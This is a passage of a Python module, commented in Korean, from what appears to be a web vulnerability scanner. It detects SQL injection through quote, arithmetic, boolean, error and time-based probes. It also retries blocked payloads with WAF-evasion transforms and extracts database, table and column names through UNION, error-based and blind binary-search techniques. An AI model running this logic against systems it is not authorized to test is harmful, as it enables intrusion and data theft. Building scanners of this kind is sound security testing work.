import concurrent.futures
import re
import string

import requests

from fbs.inference.models import AttackSurface, VulnResult
from fbs.inference.validation import classify_waf_block, try_evade, apply_named_evasion, EVASION_TRANSFORMS
from fbs.inference.compare import visible_text, diff_score, probe_token
from fbs.inference.sql_dialects import SQL_DIALECTS, DIALECT_PROBE_ORDER, detect_db_from_error, extract_error_snippet
from fbs.inference.strategies.base import BaseStrategy

"""SQLi 탐지 전략.

InferenceEngine이 크롤링을 끝낸 뒤 requests.Session으로 동기 실행한다. breaking 문자는
recon이 찾아낸 문맥(surface.extra['quote_char'])을 물려받아 쓰고, 신호가 없으면 홑따옴표(')를
기본값으로 쓴다.

시퀀스(앞 단계에서 확정되면 뒤는 건너뛴다. quote_probe/error_time의 status-only 약한 신호는
바로 확정하지 않고 보류했다가, 끝까지 아무것도 안 잡히면 최후 수단으로 쓴다):
  baseline → quote_probe → [arithmetic(숫자형)] → noise+boolean(저렴해서 먼저 시도)
  → error/time(DB별 순차, boolean이 실패했을 때만) → [status-only fallback]
확정 후 공격 벡터 확인:
  enumerate(ORDER BY 컬럼 수 + error 기반 DB명→테이블→컬럼)
  → Boolean-based로 잡혔으면 이진 탐색으로 database() blind 추출
  → [union reflect] → [union extract]
"""


class SQLiStrategy(BaseStrategy):

    VULN_TYPE = 'sqli'
    TIMEOUT = 10
    TIME_TIMEOUT = 15

    MAX_UNION_COLS = 10

    # blind 이진 탐색용 문자 후보 (DB/테이블/컬럼 식별자는 보통 이 범위 안이라 32~126 전체보다 좁게 잡음).
    BLIND_CHARSET  = sorted(ord(c) for c in string.ascii_letters + string.digits + '_')
    BLIND_MAX_LEN  = 64
    # BETWEEN 비교의 상한. '<'·'>'가 밴일 때 x > n을 x BETWEEN n+1 AND 이 값으로 바꿔 쓰는데,
    # LENGTH/ASCII 값은 이 상한보다 훨씬 작아 안전하다.
    BLIND_MAX_INT  = 4294967295

    # time-based로 확정됐을 때 db_name에서 (방언, 연결어, 지연함수)를 뽑는 표. 시간 기반 blind
    # 추출이 어떤 지연함수로 조건부 지연을 만들지 정할 때 쓴다. SQLite는 지연함수가 없어 빠졌고,
    # MSSQL/Oracle은 문자 추출 문법이 없어 추출은 건너뛰지만 방언 표시용으로 남겨둔다.
    _TIME_PROFILE = {
        'MySQL_OR':            ('MySQL',      'OR',  'sleep'),
        'MySQL_AND':           ('MySQL',      'AND', 'sleep'),
        'MySQL_OR_BENCHMARK':  ('MySQL',      'OR',  'benchmark'),
        'MySQL_AND_BENCHMARK': ('MySQL',      'AND', 'benchmark'),
        'PostgreSQL':          ('PostgreSQL', 'AND', 'pg_sleep'),
        'MSSQL':               ('MSSQL',      '',    'waitfor'),
        'Oracle':              ('Oracle',     'AND', 'dbms_pipe'),
    }

    def __init__(self, session: requests.Session | None = None):
        self.session = session or requests.Session()
        # UNION 반사 컬럼 탐지용 마커. fbssq 접두어 + 랜덤이라 페이지 기존 텍스트와 안 겹치고,
        # 실제로 쪼개진 리터럴이 SELECT돼 화면에 완성됐을 때만 본문에서 발견된다.
        self.UNION_MARKER = probe_token('fbssq')
        # (surface.url, surface.param, payload_shape) -> 최근 성공한 EVASION_TRANSFORMS 기법 이름.
        # 같은 필드라도 payload_shape(quote/boolean/error-time/blind 등)에 따라 페이로드 구조가
        # 달라서(따옴표 단독 vs AND/OR 대칭쌍 vs SLEEP 서브쿼리) 통하는 우회 기법이 갈린다. 그래서
        # 필드가 아니라 shape별로 캐싱해야 boolean에서 배운 기법을 error/time에 잘못 재사용하지 않는다.
        self._evasion_cache: dict[tuple, str] = {}
        # (surface.url, surface.param) -> blind 추출에서 확인된 DB 방언 이름
        # (SQL_DIALECTS의 키). 필드당 한 번만 판별하고 이후 재사용한다.
        self._dialect_cache: dict[tuple, str] = {}
        # (surface.url, surface.param) -> 이 필드에서 quote_char가 우회 불가로 확인됐는지.
        # run()의 quote/boolean/error-time 체인이 확정한 값을 기록해두면 _go_enumerate(UNION reflect
        # 등)에서도 참고한다. 단 각 단계는 자기 첫 시도는 직접 해보고, 그것까지 실패했을 때만 스킵한다.
        self._quote_signal: dict[tuple, bool] = {}
        # (surface.url, surface.param) -> scanner.py가 hidden_param을 발견할 때 WAF 차단을 뚫은
        # EVASION_TRANSFORMS 기법 이름(profiler가 surface.extra['discovery_evasion']로 넘긴다).
        # _evasion_cache가 아직 빈 첫 차단 때 전체 탐색 대신 이 기법부터 시도한다. 발견 당시 페이로드가
        # 특정 payload_shape와 안 맞을 수 있어 shape별이 아니라 필드 단위로만 넣어둔다.
        self._discovery_evasion_hint: dict[tuple, str] = {}
        # (surface.url, surface.param) -> recon filter_map에서 밴으로 확인된 토큰 집합.
        # 페이로드 사전검열(밴 토큰 회피)과 차단 판정(payload-aware)에 쓴다.
        self._banned_tokens: dict[tuple, set] = {}

    @staticmethod
    def _separable(signal: int, jitter: int) -> bool:
        """두 응답이 SQL 평가 때문에 갈렸는지 판정한다. signal은 갈려야 하는 두 응답의 diff,
        jitter는 같은 조건 응답끼리의 흔들림(동적 요소로 저절로 생기는 차이)이다. 신호가 흔들림의
        2배를 넘을 때만 참으로 본다 — 절대 노이즈 상수 대신 in-context 흔들림으로 상대 판정한다.
        jitter가 0이어도 1자 차이 같은 우연은 거르도록 바닥을 1로 둔다."""
        return signal > max(jitter * 2, 1)

    # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────

    def can_handle(self, surface: AttackSurface) -> bool:
        if surface.surface_type not in ('form_field', 'url_param', 'hidden_param', 'api_field'):
            return False
        hints = surface.extra.get('hints', {})
        return hints.get('sqli', 0.0) > 0

    def run(self, surface: AttackSurface) -> list[VulnResult]:
        if surface.extra.get('proxy_template'):
            print("    [SQLi] JSON 프록시 폼은 아직 미지원 — 스킵")
            return []

        quote_char = surface.extra.get('quote_char') or "'"
        if surface.extra.get('quote_char'):
            print(f"    [SQLi] recon이 찾은 따옴표 문맥 재사용: {quote_char!r}")

        known_dialect = surface.extra.get('detected_db')
        if known_dialect:
            print(f"    [SQLi] recon이 에러 시그니처로 찾은 DB 재사용: {known_dialect!r}")

        discovery_evasion = surface.extra.get('discovery_evasion')
        if discovery_evasion:
            self._discovery_evasion_hint[(surface.url, surface.param)] = discovery_evasion
            print(f"    [SQLi] hidden 파라미터 발견 당시 우회 기법 재사용 준비: {discovery_evasion!r}")

        # recon이 거부-지문으로 학습한 밴 토큰 집합. 페이로드 사전검열(회피)과 차단 판정
        # (payload-aware)에 쓴다 — 밴 토큰이 든 페이로드는 필터 거부가 확실하고, 우리 우회
        # 변형으로 그 키워드를 못 없애면 요청을 낭비하지 않는다.
        # filter_map은 토큰별 outcome('passed'/'removed'/'encoded'/'rejected'). SQL 관점에서
        # '밴'은 입력이 쿼리에 못 닿게 하는 것 = removed(입력 제거)·rejected(차단)뿐이다. encoded는
        # 출력 이스케이프라 char는 쿼리에 그대로 도달하므로 밴이 아니다(passed도 당연히 아님).
        filter_map = surface.extra.get('filter_map') or {}
        banned = {t for t, o in filter_map.items() if o in ('removed', 'rejected')}
        if banned:
            self._banned_tokens[(surface.url, surface.param)] = banned
            print(f"    [SQLi] recon 필터 지도: 밴 토큰 {sorted(banned)} — 페이로드 회피/차단 판정에 사용")

        base_fields    = self._base_fields(surface)
        original_value = base_fields.get(surface.param, 'test')

        baseline_status, baseline_body, baseline_elapsed = self._send(surface, base_fields)
        if baseline_status is None:
            print("    [SQLi] baseline 요청 실패 — 스킵")
            return []

        # stateful(시도 카운터/리셋 등으로 요청마다 응답이 바뀜) 여부는 recon이 측정 단계에서 분류한
        # 라벨을 그대로 받아 쓴다 — 전략이 다시 재지 않는다. stateful이면 content 기반 판정을 끄고
        # 시간 기반 오라클로 전환한다. content 오라클(boolean/blind/ORDER BY)의 노이즈 바닥은 따로
        # 재지 않고, 각 오라클이 자기 응답(같은 조건 반복/등가 변형)으로 흔들림을 재 상대 판정한다.
        stateful = bool(surface.extra.get('stateful'))

        # status만 바뀌고 본문 증거가 없는 약한 신호는 바로 확정 짓지 않고 보류해둔다 —
        # boolean 등 더 확실한 신호를 계속 찾아보고, 끝까지 아무것도 없으면 최후 수단으로 쓴다.
        fallback_entry = None

        def _confirm(candidate: dict | None) -> dict | None:
            nonlocal fallback_entry
            if candidate is None:
                return None
            if candidate.get('evidence_kind') == 'status':
                if fallback_entry is None:
                    fallback_entry = candidate
                return None
            return candidate

        # WAF에 차단된 페이로드(waf_hits)와 우회에 성공한 페이로드(waf_evasions)를 모아뒀다가
        # 탐지 요약에 같이 보여준다 — 최종 확정에 안 쓰인 probe의 우회 시도도 놓치지 않기 위함.
        waf_hits: list[str] = []
        waf_evasions: list[str] = []

        # 이 필드에서 quote_char(따옴표)가 우회 불가로 확인되면, 이후 quote_char가 든 페이로드는
        # 또 막힐 게 뻔해서 요청을 안 보내고 스킵한다. run() 하나(필드 하나) 안에서만 유효한
        # 상태라 지역 dict로 넘긴다.
        quote_signal = {'hopeless': False}

        vuln_entry = None
        # hidden_param은 크롤링 때 실제 값을 못 봐서(_base_fields가 늘 'test'로 채운다) 원본 값
        # 기반 판별보다, 원본 값 없이도 숫자형인지 보는 괄호 짝 비대칭 테스트를 먼저 한다. 숫자형으로
        # 확정되면 문자열 지향 탐지(quote_probe/boolean)는 방향이 틀려서 건너뛰고 이 결과를 쓴다.
        if surface.surface_type == 'hidden_param':
            vuln_entry = self._probe_hidden_syntax_break(surface, base_fields, waf_hits, waf_evasions)
            if vuln_entry:
                print(f"    [Type] hidden 필드 — 괄호 짝 테스트로 숫자형 확정, "
                      f"문자열 지향 탐지(quote_probe 등) 생략")

        if vuln_entry is None:
            vuln_entry = _confirm(self._probe_quote(surface, base_fields, baseline_status, baseline_body, quote_char, waf_hits, waf_evasions, quote_signal))

        # quote_probe 성공 여부와 상관없이 숫자형 재확인은 항상 한다 — 따옴표 하나는 숫자형
        # 컨텍스트(id = ')도 깨뜨려서 quote_probe 성공이 문자열형이라는 증거가 못 된다. arithmetic이
        # 성공하면(등가 비교라 더 확실) 존재 확정은 두고 컨텍스트 판정만 교체한다. 안 그러면 숫자형
        # 필드가 문자열형으로 잘못 확정돼 이후 %{quote_char} 접두사 페이로드가 전부 깨진다.
        if str(original_value).isdigit():
            arithmetic_entry = self._probe_arithmetic(surface, base_fields, baseline_body, original_value)
            if arithmetic_entry:
                if vuln_entry and vuln_entry.get('detected_db') not in (None, 'Unknown'):
                    arithmetic_entry['detected_db'] = vuln_entry['detected_db']
                vuln_entry = arithmetic_entry

        # boolean이 error/time보다 훨씬 저렴하고(SLEEP 대기 없음) 잡히면 이진 탐색 추출까지 바로
        # 붙어서 먼저 시도한다. 단 stateful 타깃에선 참/거짓 본문 차이가 SQL 평가가 아니라 앱
        # 상태(카운터/리셋)에서 나와 못 믿으니, boolean을 건너뛰고 상태와 무관한 error/time으로 직행한다.
        if vuln_entry is None and stateful:
            print(f"    [Stateful] recon이 stateful로 분류한 타깃 — content 기반 boolean 탐지는 "
                  f"신뢰 불가라 스킵, error/time으로 직행")
        elif vuln_entry is None:
            vuln_entry = self._probe_boolean(surface, base_fields, original_value, quote_char, waf_hits, waf_evasions, quote_signal)

        if vuln_entry is None:
            vuln_entry = _confirm(self._probe_error_time(surface, base_fields, baseline_status, baseline_elapsed, quote_char, waf_hits, waf_evasions, quote_signal, known_dialect=known_dialect))

        if vuln_entry is None and fallback_entry is not None:
            print(f"    [Fallback] 본문 증거도 boolean/error/time 확정도 없음 — 상태코드 변화만으로 "
                  f"의심 신호 채택(확정 아님): {fallback_entry['type']}")
            vuln_entry = fallback_entry

        if vuln_entry is None:
            if waf_hits:
                print(f"    [SQLi] 취약점 미확정 — WAF가 {len(waf_hits)}개 페이로드를 차단해서 판단 불가했음 (수동 확인 권장)")
            return []

        vuln_entry['waf_hits'] = waf_hits
        vuln_entry['waf_evasions'] = waf_evasions
        vuln_entry['stateful'] = stateful
        # dialect를 못 알아낸 경로로 확정됐으면(detected_db가 없거나 'Unknown') recon이 찾아둔 값으로
        # 채워서, _resolve_dialect가 재프로빙 없이 재사용하게 한다.
        if known_dialect and vuln_entry.get('detected_db') in (None, 'Unknown'):
            vuln_entry['detected_db'] = known_dialect
        # _go_enumerate(UNION reflect 등)가 참고하게 quote_char hopeless 여부를 필드별 상태로 넘긴다 —
        # arithmetic/fallback으로 확정되면 quote_char는 한 번도 안 통했을 수 있는데 _go_enumerate의
        # probe는 여전히 quote_char를 쓰기 때문이다.
        self._quote_signal[(surface.url, surface.param)] = quote_signal['hopeless']

        # 필드가 숫자형으로 확정됐으면 이후 열거/추출 페이로드는 따옴표 접두사(%')가 아니라 순수
        # 숫자 필러를 써야 한다 — 숫자형에 따옴표를 붙이면 불필요한 구조라, 따옴표 하나만 보고
        # 차단하는 WAF가 있으면 우회 기법(공백·대소문자만 바꿀 뿐 따옴표를 없애진 못한다)으로도 못
        # 뚫는다. arithmetic이면 검증된 original_value를, syntax_break면 정상 응답을 확인한 9를 쓴다.
        enum_baseline_status, enum_baseline_body = baseline_status, baseline_body
        if vuln_entry['type'].startswith('Arithmetic-based SQL Injection'):
            numeric_filler = str(original_value) if str(original_value).isdigit() else '9'
            injection_prefix = numeric_filler
            print(f"    [SQLi] 숫자형 컨텍스트로 확정 — 이후 페이로드는 따옴표 없이 "
                  f"원시 숫자 접두사({injection_prefix!r})를 씀")
            # 두 probe 다 comment 없이 확정에 성공했다 — 인젝션 지점 뒤에 원래 아무것도 안 남는다는
            # 뜻이라, dialect도 comment 없이 판별해 comment 자체가 필요 없음을 같이 보인다.
            comment, fresh_status, fresh_body = self._probe_numeric_comment(
                surface, base_fields, injection_prefix, vuln_entry, waf_hits, waf_evasions,
            )
            # _go_enumerate의 baseline도 이 fresh 응답으로 바꾼다 — 처음 캡처한 baseline_body는
            # placeholder(test)로 받은 거라, 숫자형 컬럼에서는 test가 존재하지 않는 컬럼 참조로 파싱돼
            # 그 자체가 에러 응답일 수 있다. 이미 깨진 baseline과 비교하면 ORDER BY 판정이 통째로
            # 뒤집힌다. injection_prefix 단독 응답이 있으면 그걸로 교체하고, 못 구했으면 기존 것을 유지한다.
            if fresh_status is not None:
                enum_baseline_status, enum_baseline_body = fresh_status, fresh_body
            else:
                print(f"    [SQLi] fresh baseline 확보 실패 — 기존 placeholder 기반 baseline 유지(신뢰도 낮을 수 있음)")
        else:
            triggering = vuln_entry.get('true_payload') or vuln_entry.get('payload', '')
            # %는 LIKE 패턴(검색창 등)에서나 필요한 관례라, 등호(=) 비교처럼 %없이 확정된 필드엔
            # 불필요한 문자다. %를 무조건 붙이면 %가 필터링되는 사이트에선 확정 이후 enumerate/blind
            # 페이로드가 전부 걸려 같은 거부 응답만 받는다. 그래서 확정에 성공한 페이로드가 %로
            # 시작했는지를 그대로 재사용한다 — %를 안 쓰는 경로(quote_probe/error_time)도 이걸로 커버된다.
            injection_prefix = quote_char if not triggering.startswith('%') else f"%{quote_char}"
            # 확정 페이로드가 어떤 comment(--, #)로 성공했는지 그대로 재사용한다 — 확인이 안 되면
            # 여러 방언 공통인 --를 기본값으로 쓴다(#는 MySQL 전용이라 다른 방언에선 구문 오류를 낼 수
            # 있다). MySQL은 -- 뒤에 공백이 없으면 주석으로 안 보므로, comment 값에 공백을 포함해 어디서
            # 갖다 써도 안전하게 만든다.
            stripped = triggering.rstrip()
            if stripped.endswith('--'):
                comment = '-- '
            elif stripped.endswith('#'):
                comment = '#'
            else:
                comment = '-- '

        self._go_enumerate(surface, base_fields, enum_baseline_body, enum_baseline_status, vuln_entry,
                            injection_prefix, comment, waf_hits, waf_evasions, stateful=stateful)
        self._print_summary(surface, quote_char, vuln_entry)
        return [self._to_vuln_result(surface, vuln_entry)]

    @classmethod
    def _clean_dialect(cls, vuln_entry: dict) -> str | None:
        """vuln_entry['detected_db']를 사람이 읽기 좋은 방언 이름으로 정규화한다 — time-based 변형
        이름(MySQL_OR_BENCHMARK→MySQL)과 fingerprint의 (추정) 꼬리표를 걷어낸다. 판별된 게 없거나
        Unknown이면 그대로 둔다."""
        raw = vuln_entry.get('detected_db') or ''
        profile = cls._TIME_PROFILE.get(raw)
        if profile:
            return profile[0]
        return raw.replace(' (추정)', '').strip() or None

    def _print_summary(self, surface: AttackSurface, quote_char: str, vuln_entry: dict) -> None:
        """탐지 방식별로 왜 이렇게 판단했는지 근거를 사람이 읽을 수 있게 출력한다."""
        vtype = vuln_entry['type']
        print(f"\n    ══ 탐지 요약 ══════════════════════════════")
        print(f"    필드      : {surface.param} ({surface.surface_type})")
        print(f"    위치      : {surface.method} {surface.url}")
        print(f"    탐지 방식 : {vtype}")
        print(f"    따옴표    : {quote_char!r}")
        db_display = self._clean_dialect(vuln_entry)
        if db_display and db_display != 'Unknown':
            print(f"    DB        : {db_display}")
        if vuln_entry.get('stateful'):
            print(f"    ⚠ 상태    : recon이 stateful로 분류한 타깃 — 같은 요청에도 응답이 바뀜(시도 카운터/리셋 등). "
                  f"content 기반 판정은 신뢰 낮아 시간 기반 오라클만 사용했고, 자동 추출이 상태 리셋에 막힐 수 "
                  f"있으니 수동 확인 권장")

        if vtype == 'Error-based SQL Injection (Quote Probe)':
            self._print_error_evidence(vuln_entry, f"따옴표 하나(\"{vuln_entry['payload']}\")만 넣었는데")

        elif vtype == 'SQL Injection 의심 (미확정)':
            self._print_error_evidence(vuln_entry, f"페이로드(\"{vuln_entry['payload']}\") 주입 시")
            print(f"    주의      : 본문 증거·boolean·error·time 중 어느 것도 확정 못 함 — 상태코드 변화 "
                  f"하나뿐이라 SQL 문법 오류가 아닌 다른 원인일 가능성도 있음. 반드시 수동으로 재현/확인할 것")

        elif vtype == 'Arithmetic-based SQL Injection':
            print(f"    근거      : 페이로드 \"{vuln_entry['payload']}\"(원래 값과 수학적으로 같은 값)는 "
                  f"baseline과 길이가 거의 같고(base={vuln_entry['baseline_len']}, "
                  f"eq={vuln_entry['eq_response_len']}), 다른 값을 넣은 neq={vuln_entry['neq_response_len']}는"
                  f" 확연히 다름 — 필드값이 문자열이 아니라 실제 산술 연산되고 있다는 뜻 (따옴표 없이도 우회 가능)")

        elif vtype == 'Arithmetic-based SQL Injection (Syntax Break)':
            print(f"    근거      : hidden 필드라 원본 값을 몰라 등가 비교 대신 괄호 짝 문법 비대칭을 씀 — "
                  f"균형 잡힌 값(9, (9), ((9)))은 baseline과 응답이 비슷했고(diff={vuln_entry['balanced_diffs']}, "
                  f"threshold={vuln_entry['noise_threshold']}), 불균형 값(9), (9)은 확연히 달랐음"
                  f"(diff={vuln_entry['broken_diffs']}) — 괄호를 문법 단위로 해석하는 SQL 파서가 있다는 뜻. "
                  f"깨진 페이로드(\"{vuln_entry['payload']}\")를 한 번 더 보내 같은 차이(diff={vuln_entry['retry_diff']})"
                  f"가 재현되는 것까지 확인해 우연한 노이즈 가능성을 배제함")

        elif vtype == 'Error-based SQL Injection':
            self._print_error_evidence(
                vuln_entry, f"{vuln_entry['detected_db']}용 페이로드(\"{vuln_entry['payload']}\") 주입 시"
            )

        elif vtype == 'Time-based SQL Injection':
            waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
            print(f"    근거      : {vuln_entry['detected_db']} 계열 시간 지연 페이로드 주입 시 응답이 "
                  f"baseline({vuln_entry['baseline_duration']}s) 대비 {vuln_entry['attack_time']}s로 느려졌고,"
                  f" 곧바로 보낸 재검증 요청은 다시 {vuln_entry['verify_time']}s로 정상 — 우연한 지연이 아니라"
                  f" 페이로드가 DB에서 실제로 실행됐다는 뜻 (에러도 안 뜨고 내용도 안 바뀌는 blind 케이스에서 유효){waf_note}")

        elif vtype == 'Boolean-based SQL Injection':
            waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
            print(f"    근거      : 리터럴만 바꾼 참 조건들끼리·거짓 조건들끼리 응답이 뭉치고, 두 뭉치가 "
                  f"갈림 (논리 진리값에 따라 갈리므로 SQL이 평가된 증거){waf_note}")
            print(f"                true  \"{vuln_entry['true_payload']}\" → {vuln_entry['true_response_len']}자")
            print(f"                false \"{vuln_entry['false_payload']}\" → {vuln_entry['false_response_len']}자")
            print(f"                뭉치 내부 흔들림={vuln_entry['intra_spread']}자, 뭉치 사이 간격={vuln_entry['separation']}자 "
                  f"(간격 > 흔들림×2라야 확정)")
            print(f"                → 글자(리터럴)가 아니라 참/거짓 논리로 갈린다는 건 그 조건이 "
                  f"쿼리 로직 안에서 실제로 평가되고 있다는 뜻")

        waf_evasions = vuln_entry.get('waf_evasions') or []
        if waf_evasions:
            print(f"    WAF 우회  : {len(waf_evasions)}건 성공 — 최종 탐지에 쓰인 probe가 아니어도"
                  f" WAF가 있다는 것과 뚫린다는 것 자체가 유의미함")
            for hit in waf_evasions[:5]:
                print(f"                · {hit}")
            if len(waf_evasions) > 5:
                print(f"                · 외 {len(waf_evasions) - 5}건")

        waf_hits = vuln_entry.get('waf_hits') or []
        if waf_hits:
            print(f"    WAF 감지  : {len(waf_hits)}건 차단됨 — 아래 시도들은 WAF에 막혀서 판단 불가했음"
                  f" (실제로는 더 확실하게 탐지됐을 수 있음, 수동 확인 권장)")
            for hit in waf_hits[:5]:
                print(f"                · {hit}")
            if len(waf_hits) > 5:
                print(f"                · 외 {len(waf_hits) - 5}건")

        self._print_attack_vectors(vuln_entry.get('attack_vectors', {}))
        print(f"    ══════════════════════════════════════════")

    # 벡터 종류가 늘어나도 여기 라벨/렌더러만 추가하면 됨.
    ATTACK_VECTOR_LABELS = {
        'error_based':   'Error-based',
        'blind_boolean': 'Blind (Boolean 이진 탐색)',
        'blind_time':    'Blind (Time 이진 탐색)',
        'UNION':         'UNION',
    }

    def _print_attack_vectors(self, av: dict) -> None:
        possible = [self.ATTACK_VECTOR_LABELS.get(k, k) for k, v in av.items() if v.get('possible')]
        print(f"\n    ── 공격벡터 ──────────────────────────────")
        print(f"    가능한 공격 방식 : {', '.join(possible) if possible else '없음 (blind 방식으로만 공격 가능)'}")

        for key, label in self.ATTACK_VECTOR_LABELS.items():
            vec = av.get(key)
            if not vec or not vec.get('possible'):
                continue
            print(f"\n    [{label}]")
            if key == 'error_based':
                self._print_error_based_vector(vec)
            elif key == 'blind_boolean':
                self._print_blind_vector(vec)
            elif key == 'blind_time':
                self._print_blind_time_vector(vec)
            elif key == 'UNION':
                self._print_union_vector(vec)

    @staticmethod
    def _print_blind_vector(vec: dict) -> None:
        print(f"      사용 명령어 : LENGTH()/ASCII(SUBSTRING()) 이진 탐색 — 참/거짓 오라클로 문자 단위 추출")
        print(f"      결과        : DB명={vec.get('db_name')}")

    @staticmethod
    def _print_blind_time_vector(vec: dict) -> None:
        print(f"      사용 명령어 : IF(cond, 지연, 즉시) 조건부 시간 지연 — 응답 시간을 오라클로 문자 단위 추출")
        if vec.get('db_name'):
            print(f"      결과        : DB명={vec['db_name']}")
        else:
            print(f"      결과        : DB명 추출 실패 (방언만 확인: {vec.get('dialect')})")

    @staticmethod
    def _print_error_based_vector(vec: dict) -> None:
        print(f"      사용 명령어 : extractvalue(1,concat(0x7e,expr)) / updatexml(...) — "
              f"DB명 → 테이블 → 컬럼 순으로 확인")
        result = f"DB명={vec.get('db_name')}"
        if vec.get('table_name'):
            result += f", 테이블={vec['table_name']}"
        if vec.get('column_name'):
            result += f", 컬럼={vec['column_name']}"
        print(f"      결과        : {result}")

    @staticmethod
    def _print_union_vector(vec: dict) -> None:
        """실제로 사용된 페이로드를 그대로 보여준다 — 웹 폼에 직접 붙여넣어 재현할 수 있도록."""
        reflect = vec.get('reflected_column')
        result = f"컬럼 수={vec.get('columns')}"
        result += f", 반사 컬럼={reflect}번째" if reflect else ", 반사 컬럼 없음(blind)"
        print(f"      결과        : {result}")

        # 주의: !r(repr)로 찍으면 탭 같은 특수문자가 '\t'라는 두 글자 텍스트로 escape되어
        # 보여서, 그걸 그대로 복사해 붙여넣으면 진짜 탭이 아니라 백슬래시+t 문자가 들어가
        # 페이로드가 깨진다. 사람이 그대로 복사해서 쓸 값이니 여기서는 원문 그대로 찍는다.
        if vec.get('order_by_payload'):
            print(f"      컬럼 수 확인 페이로드 : \"{vec['order_by_payload']}\"")
            print(f"                             (이 값 넣으면 정상 응답과 달라짐 — 컬럼 수가 {vec.get('columns')}개라는 증거)")
        if vec.get('reflect_payload'):
            print(f"      반사 컬럼 확인 페이로드 : \"{vec['reflect_payload']}\"")
            print(f"                               (이 값 넣으면 화면에 마커 문자열이 그대로 보임)")

        if vec.get('db_name'):
            print(f"      DB명 추출 페이로드   : \"{vec.get('db_name_payload')}\"")
            print(f"                             → 결과: {vec['db_name']}")
        if vec.get('tables'):
            print(f"      테이블 추출 페이로드 : \"{vec.get('tables_payload')}\"")
            print(f"                             → 결과: {vec['tables']}")
        elif reflect and not vec.get('db_name'):
            print(f"      비고        : 반사 컬럼은 찾았지만 DB명/테이블 추출은 실패 "
                  f"(마커 패턴 불일치 — 수동으로 페이로드 조정하면 더 뽑아낼 수 있음)")

    @staticmethod
    def _print_error_evidence(vuln_entry: dict, lead_in: str) -> None:
        """error_in_body(실제 에러 메시지 노출)와 status_error(상태코드만 바뀜)를 구분해서 근거를 보여준다."""
        waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
        if vuln_entry.get('evidence_kind') == 'body':
            print(f"    근거      : {lead_in} 응답 본문에 {vuln_entry['detected_db']} 에러 메시지가 그대로 노출됨"
                  f" — 입력값이 필터링 없이 SQL 문법에 꽂혀서 DB 엔진이 직접 에러를 뱉었다는 뜻{waf_note}")
            if vuln_entry.get('error_snippet'):
                print(f"                에러 메시지: {vuln_entry['error_snippet']!r}")
        else:
            print(f"    근거      : {lead_in} 응답 상태가 baseline({vuln_entry['baseline_status']}) → "
                  f"probe({vuln_entry['attack_status']})로 바뀜 — 에러 메시지 자체는 화면에 안 보이지만"
                  f" 상태코드 변화로 쿼리가 깨졌다는 걸 알 수 있음 (본문은 숨겨져 있어 수동 확인 권장){waf_note}")

    @staticmethod
    def _payload_shape(label: str) -> str:
        """label에서 페이로드 종류만 뽑는다 — error/time(MySQL_OR) → error/time,
        boolean(true)/boolean(verify-true) → boolean 등. 캐시 키를 필드 단위가 아니라
        (필드, 종류) 단위로 좁히는 데 쓴다."""
        return label.split('(')[0]

    def _banned_in(self, surface, payload: str) -> str | None:
        """payload에 이 필드에서 밴으로 확인된 토큰(recon filter_map)이 있으면 그 토큰을 반환한다.
        앱 필터가 보통 그렇듯 소문자 substring으로 본다 — 그래야 order 같은 토큰이 어디에 있든
        잡는 앱 동작과 일치한다."""
        banned = self._banned_tokens.get((surface.url, surface.param))
        if not banned:
            return None
        low = payload.lower()
        for tok in banned:
            if tok in low:
                return tok
        return None

    def _is_refused(self, surface, payload: str, status, body: str) -> bool:
        """이 응답이 서버가 우리 페이로드를 거부/필터한 것인지 판정한다 — 밴(recon 학습)과 WAF를
        한 기준으로 통합한 단일 거부 판정.

          1) payload에 밴 토큰(recon filter_map)이 있으면 → 앱 substring 필터가 SQL 실행 전에
             발동하므로 확실한 거부.
          2) 벤더 시그니처/rate-limit(classify_waf_block의 강한 판정)이면 → 확실한 WAF 차단.

        그 외는 거부로 단정하지 않는다. 제네릭 키워드(hack 등) 단독 매치를 길이로 재검증하던
        방식은, 거부 페이지가 성공 페이지와 거의 같은 앱에선 성공 응답까지 차단으로 오인해 신호를
        잃었다. 밴은 filter_map으로 정확히 알고 진짜 WAF는 벤더 시그니처로 잡히니, 애매한 제네릭
        판정은 무시하는 게 오탐이 적다."""
        if self._banned_in(surface, payload) is not None:
            return True
        blocked, name, _ = classify_waf_block(status, body)
        return bool(blocked and name and name != 'Unknown / Custom WAF')

    def _try_evade(self, surface, base_fields, payload: str, label: str, waf_hits: list, waf_evasions: list,
                    dialect: str | None = None, quiet: bool = False):
        """payload가 WAF에 막혔을 때 우회 변형들을 재시도한다.

        같은 필드·같은 payload_shape에서 최근 성공한 기법이 있으면 그것 하나만 먼저 시도한다(요청
        1개) — blind 추출처럼 같은 모양 페이로드를 수백 번 보내는 구간에서 매번 전체를 재탐색하지
        않기 위해서다. shape까지 키에 넣은 건, boolean에서 통한 기법이 error/time처럼 구조가 다른
        페이로드엔 안 통할 수 있어서다(필드 단위로만 캐싱하면 캐시 효과가 없다).

        캐시된 기법이 실패하면 전체를 다시 훑되 방금 실패한 기법은 skip으로 넘겨 중복을 피하고,
        새로 찾은 기법으로 캐시를 갱신한다. dialect는 try_evade에 넘겨 SQLite엔 안 통하는
        substr_no_comma 같은 방언 전용 기법이 걸러지게 한다.
        """
        # payload에 밴 토큰이 있는데 우리 우회 변형 중 그 토큰을 실제로 없애는 게 하나도 없으면
        # (order/union/database 같은 substring 밴은 공백·대소문자 변형으론 못 지운다), 우회가 무의미
        # 하니 요청을 낭비하지 않고 바로 실패 처리한다. 우회는 구조적 WAF(공백·키워드 경계)용이지
        # 키워드 밴용이 아니다 — 키워드 밴은 페이로드 자체를 밴 없는 형태로 바꿔야 뚫린다.
        banned = self._banned_in(surface, payload)
        if banned and not any(banned not in transform(payload).lower() for _, transform in EVASION_TRANSFORMS):
            if not quiet:
                print(f"    [Evade] {label}: 밴 토큰 {banned!r} 포함 — 우회 변형으로 못 없앰, 스킵(요청 아낌)")
            waf_hits.append(f"{label}(\"{payload}\") → 밴 토큰 {banned!r}, 우회 불가로 스킵")
            return None

        key = (surface.url, surface.param, self._payload_shape(label))
        cached_name = self._evasion_cache.get(key)
        tried_and_failed = None
        if cached_name:
            # apply_named_evasion은 단일 기법 이름(inline_comment)과 조합 이름(inline_comment+case_mix)을
            # 둘 다 처리한다 — 캐시에 조합이 들어있어도 못 알아보고 매번 전체 탐색으로 새는 일이 없다.
            variant = apply_named_evasion(cached_name, payload)
            if variant != payload:
